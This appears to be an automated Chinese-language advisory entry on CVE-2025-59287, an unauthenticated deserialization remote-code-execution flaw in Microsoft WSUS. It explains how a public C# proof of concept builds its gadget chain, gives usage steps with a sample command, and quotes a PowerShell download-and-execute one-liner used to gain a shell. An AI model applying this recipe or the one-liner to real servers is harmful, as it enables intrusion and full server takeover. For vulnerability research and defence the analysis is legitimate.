## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 不安全反序列化/远程代码执行(RCE)

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 不安全反序列化/远程代码执行(RCE)

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2012, Windows Server 2019, Windows Server 2022, Windows Server 2025

**利用条件:** 无需认证/远程网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-59287是一个针对Microsoft Windows Server Update Services (WSUS)组件的高危远程代码执行(RCE)漏洞，CVSS评分为9.8。该漏洞的根本原因是WSUS在处理`AuthorizationCookie`等特制事件时，存在不安全的反序列化缺陷。攻击者无需任何身份验证，通过发送精心构造的请求，利用.NET的`BinaryFormatter`机制中不安全的对象反序列化，可以在目标WSUS服务器上执行任意代码，从而完全控制受影响的服务器。此漏洞影响广泛，包括Windows Server 2012、2019、2022和2025等多个版本，且已被观察到在野利用的迹象。

**POC有效性分析:**
提供的POC代码是一个用C#编写的命令行工具，名为`WSUSploit.NET`，其设计旨在利用CVE-2025-59287。代码结构清晰，主要包含两个核心类：`WSUServer`和`Sploit`。
`WSUServer`类负责与WSUS服务器进行交互，包括发起HTTP请求以获取`ServerId`、`AuthCookie`和`ReportingCookie`。这些步骤旨在模拟正常WSUS客户端与服务器的通信流程，确保POC能够正确地与目标服务握手。最终，`WSUServer`通过`SendMaliciousEvent`方法发送一个包含恶意反序列化payload的HTTP POST请求到WSUS服务器的`ReportingWebService.asmx`或类似端点。
`Sploit`类是payload生成的核心。它首先构建一个XAML字符串，该字符串利用`System.Windows.Data.ObjectDataProvider`来执行任意系统命令。具体来说，它配置了一个`System.Diagnostics.Process`对象，并将`ProcessStartInfo`属性设置为执行`cmd.exe /c <command>`。这种XAML注入技术是.NET反序列化利用中的常见手法，允许攻击者在目标进程的上下文中执行系统命令。
为了使这个XAML字符串能够被WSUS服务器不安全地反序列化，`Sploit`类巧妙地将其封装在一个名为`TextFormattingRunPropertiesMock`的自定义可序列化类中。这个`TextFormattingRunPropertiesMock`类通过实现`System.Runtime.Serialization.ISerializable`接口，在序列化过程中动态修改其类型信息，使其伪装成`Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`类型（此类型存在于`Microsoft.PowerShell.Editor`程序集中）。然后，恶意XAML payload被放置在其`ForegroundBrush`属性中。这种伪装是漏洞利用的关键，因为它欺骗了服务器，使其认为正在反序列化一个合法的、预期的类型，但实际上内部包含了能够触发命令执行的恶意XAML。
最后，`Sploit`类利用已被微软标记为不安全的`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`将这个封装了恶意XAML的对象序列化成二进制数据流，生成最终的payload。
综合来看，该POC代码从payload构造到传输的整个流程都设计得当，利用了.NET不安全反序列化的典型模式，并且通过模拟WSUS协议与服务器进行交互。其逻辑明确，没有发现明显的错误或缺失，因此评估其功能完整性高，具备实际利用价值。

**利用步骤:**
使用该POC工具的步骤相对直接：
1. **获取并编译代码**: 首先需要下载并使用C#编译器（如Visual Studio或.NET SDK）编译`WSUSploit.NET`项目。这通常会生成一个可执行文件（例如`WSUSploit.NET.exe`）。
2. **执行命令**: 在命令行中运行编译后的可执行程序，并提供目标WSUS服务器的完整URL和要在目标服务器上执行的系统命令。
   例如：`WSUSploit.NET https://your-wsus-server:8531 "calc.exe"`
   其中，`https://your-wsus-server:8531`应替换为目标WSUS服务器的实际地址和端口（WSUS通常在8530/8531端口运行），`calc.exe`是要在目标服务器上执行的命令。请注意，这里的命令需要是目标系统上可执行的命令，例如Windows系统下的`calc.exe`、`notepad.exe`等。
3. **观察结果**: 如果漏洞利用成功，目标WSUS服务器将根据指定的命令执行相应的操作。例如，如果执行`calc.exe`，则在服务器的桌面上可能会弹出一个计算器程序（取决于WSUS服务运行的用户权限和会话）。在实际的攻击场景中，攻击者通常会利用此漏洞执行更具破坏性的命令，如搜索结果3中提及的下载恶意PowerShell脚本（例如`powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/power...')`），从而获取一个完全的系统shell，进一步控制服务器。

**投毒风险分析:**
对该POC代码的投毒风险评估为低（10%）。这是基于对代码结构、依赖项、网络行为和预期功能的全面审查。
1. **代码清晰度**: POC代码逻辑清晰，所有关键功能（如payload构造、数据序列化、网络通信等）都以可读性强的方式实现。代码中没有发现任何形式的代码混淆，变量和函数命名也具有良好的自解释性，使得安全研究人员能够轻松地审计其内部工作原理。
2. **依赖库**: 代码主要依赖于标准的.NET系统库（如`System.Text`, `System.Net.Http`, `System.Xml.Linq`, `System.Security`, `System.IO`, `System.Runtime.Serialization.Formatters.Binary`）。这些都是微软官方提供并广泛使用的库，本身不包含任何恶意功能。POC并未引入任何不常见或第三方依赖，进一步降低了引入外部恶意组件的风险。
3. **外部请求**: POC工具本身没有发起任何可疑的、与漏洞利用目的无关的外部网络请求。它所有的网络通信都严格指向用户在命令行参数中指定的目标WSUS服务器，用于漏洞的探测和payload的传输。代码中没有发现任何硬编码的外部恶意脚本下载链接或C2服务器地址。
4. **恶意行为界定**: POC工具的主要目的是生成并发送一个不安全的反序列化payload以实现远程代码执行。这属于其作为安全研究工具的“预期功能”，而非“投毒”。它不会在执行POC的主机上植入后门、窃取本地数据或进行其他未授权的恶意行为。POC执行的命令完全由用户通过命令行参数（`CMD`）明确指定，其在目标服务器上产生的后果（例如执行`calc.exe`或下载并运行PowerCat）是目标系统上命令执行的结果，而非POC工具自身的投毒行为。
5. **混淆与可疑代码**: 代码中没有使用`eval()`、动态代码加载（如`System.Reflection.Assembly.Load`）或其他可能被滥用于动态加载或执行恶意代码的可疑结构。也没有发现通过非标准方法进行加密或编码敏感数据，或试图规避安全检测的行为。
综上所述，该POC代码是典型的、专注于实现特定漏洞利用的工具，其设计和实现透明、直接。它没有表现出超出其安全研究目的的额外恶意功能，因此被认为具有较低的投毒风险。然而，任何执行此类工具的用户都应确保其来源可靠，并在受控环境中进行测试，以避免对非预期系统造成影响，并理解其利用功能可能带来的风险。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-59287
